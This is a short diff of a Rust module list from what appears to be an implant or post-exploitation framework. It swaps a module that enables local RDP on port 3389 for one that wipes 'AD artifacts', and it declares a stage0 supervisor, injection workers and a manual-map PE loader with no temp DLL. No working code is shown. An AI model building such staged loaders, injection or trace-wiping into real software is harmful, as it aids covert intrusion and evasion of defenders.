@@ -71,13 +71,13 @@ pub mod syscalls;
 pub mod module_loader;
 #[cfg(feature = "module-loader")]
 pub mod module_package;
-/// Process-isolated workers for product L2 (desktop / iso_host / inject).
+/// Process-isolated workers for product L2 (inject / ad).
 /// Stage0 never LoadLibrary/Manual-Map product modules — see docs/MODULE_WORKER_ISOLATION.md.
 #[cfg(feature = "module-loader")]
 pub mod module_supervisor;
-/// Enable local RDP (3389) when L2 desktop is staged (Windows).
+/// Stage0-local AD artifact wipe (path-prefix safe; no worker).
 #[cfg(feature = "module-loader")]
-pub mod rdp_enable;
+pub mod ad_artifact;
 /// Manual-Map PE loader for L2 modules (no temp DLL).
 /// Product whitelist modules must not use this path (supervisor only).
 #[cfg(all(windows, feature = "mem-map"))]
